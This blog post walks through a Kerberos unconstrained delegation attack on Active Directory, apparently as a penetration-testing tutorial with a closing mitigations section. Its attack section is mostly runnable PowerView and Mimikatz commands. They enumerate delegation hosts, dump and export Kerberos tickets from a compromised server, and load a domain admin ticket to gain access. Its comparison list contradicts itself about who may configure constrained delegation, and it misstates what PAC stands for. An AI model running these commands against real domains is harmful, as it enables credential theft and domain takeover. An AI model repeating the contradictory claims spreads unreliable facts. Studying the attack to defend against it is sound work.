---
title: 'Delegation Attacks (PT2)'
date: '2021-06-09'
layout: post
tag: [Delegation, AD, Kerberos]
excerpt: >-
  Kerberos delegation attacks and their impact
description: >-
  Kerberos delegation attacks and their impact
image: '/images/posts/kerbgt-delegation-2/header.png'
thumb_image: '/images/posts/kerbgt-delegation-2/header.png'
style: code
---

# Introduction

In a previous blog post, we discussed [Kerberos Delegation Attacks](https://pwntales.com/blog/kerberos-delegation-part-1). 
We briefly explained the different attack types, compared them, and finally attacked the Constrained Delegation type.

In this blog post, we’ll move to the most dangerous delegation attack, which is named Unconstrained. We won’t analyze it much as it is similar to Constrained. However, the main differences between those two are:

1. Scope of delegation: Unconstrained delegation allows a service to impersonate a user to any other service, while constrained delegation restricts the services to which the specified server can act on behalf of a user.
2. Security: Unconstrained delegation is considered very dangerous because it allows a compromised service to impersonate any user without restrictions. Constrained delegation is considered safer because it restricts the services to which the specified server can act on behalf of a user.
3. Configuration: Unconstrained delegation requires domain administrator privileges to configure a domain account for delegation. Service administrators can configure constrained delegation.
4. Domain requirements: Unconstrained delegation can be configured in any domain, while constrained delegation requires domain administrator privileges to configure a domain account for delegation.
5. Compatibility: Unconstrained delegation is compatible with all versions of Windows, while constrained delegation requires Windows Server 2003 or later.

## How it works

- The user presents its TGT to the DC when requesting a service ticket.
- The DC opens the TGT and validates the PAC(Privilege Authorization Certificate) checksum. If the DC can open the ticket and the checksum, then the TGT is valid. The data in the TGT is copied to create the service ticket, and the DC places a copy of the user’s TGT into the service ticket.
- The service ticket is encrypted using the target service account’s NTLM hash and sent to the user (TGS-REP).
- The user connects to the server hosting the service on the appropriate port and presents the service ticket (AP-REQ). The service opens the service ticket using its NTLM password hash.

![](/images/posts/kerbgt-delegation-2/screenshot.jpg)

## Attack in motion

We can use the [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) Unconstrained module to search for unconstrained delegation in the domain.

```powershell
Get-NetComputer -Unconstrained #DC always appear but isnt useful for privesc
```

![](/images/posts/kerbgt-delegation-2/screenshot_1.jpg)

or with the Active Directory PowerShell module cmdlet

```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
```

![](/images/posts/kerbgt-delegation-2/screenshot_2.jpg)

```powershell
Get-ADComputer -LDAPFilter ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’
```

![](/images/posts/kerbgt-delegation-2/screenshot_3.jpg)

Once we have found a server with Kerberos Unconstrained Delegation, we need to compromise the server with an admin or service account. Or social engineer a Domain Admin to connect on any service on the computer with unconstrained delegation.

Check if we have local admin access or not.

```powershell
Find-LocalAdminAccess
```

![](/images/posts/kerbgt-delegation-2/screenshot_4.jpg)

We have local admin access on the User-Server.  
Next, we can use PowerShell remoting to enter the session on the remote object and run [Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1) to grab all the tickets on the machine.

```powershell
Enter-PSSesion -ComputerName User-Server.first.local
```

![](/images/posts/kerbgt-delegation-2/screenshot_5.jpg)

Export tickets with Mimikatz

```powershell
Invoke-Mimikatz -Command privilege::debug;
Invoke-Mimikatz -command '"sekurlsa::tickets /export"'
```

![](/images/posts/kerbgt-delegation-2/screenshot_6.jpg)

Now, here we have a ticket available to us, and we must load it to memory

```powershell
Invoke-Mimikatz -command '"kerberos::ptt 0-60810000-admin@krbtgt~FIRST.LOCAL-FIRST.LOCAL.kirbi"'
```

![](/images/posts/kerbgt-delegation-2/screenshot_7.jpg)

And finally, after loading the ticket, we can confirm access to the CIFS service.

![](/images/posts/kerbgt-delegation-2/screenshot_8.jpg)

# Mitigations

Similar to constrained delegation, this type of attack can be mitigated a similar way

- Don’t use Kerberos Unconstrained Delegation. Configure the servers that require delegation with Constrained Delegation.
- Configure all elevated administrator accounts to be “Account is sensitive and cannot be delegated.”

![](/images/posts/kerbgt-delegation-2/screenshot_9.jpg)

- The **“Protected Users” group** mitigates this issue since delegation is not allowed for accounts in this group.

Caution, after the Protected-Users group account is upgraded, the domain won’t be able to authenticate using:

- Default credential delegation (CredSSP). Plain text credentials are not cached even when enabled by the **Allow delegating default credentials** Group Policy setting.
- Windows Digest. Plain text credentials are not cached even when Windows Digest is enabled.
- NTLM. The result of the NT one-way function, NTOWF, is not cached.
- Kerberos long-term keys. The keys from Kerberos initial TGT requests are typically cached so the authentication requests are not interrupted. For accounts in this group, Kerberos protocol verifies authentication at each request..
- Sign-in offline. A cached verifier is not created at sign-in.













































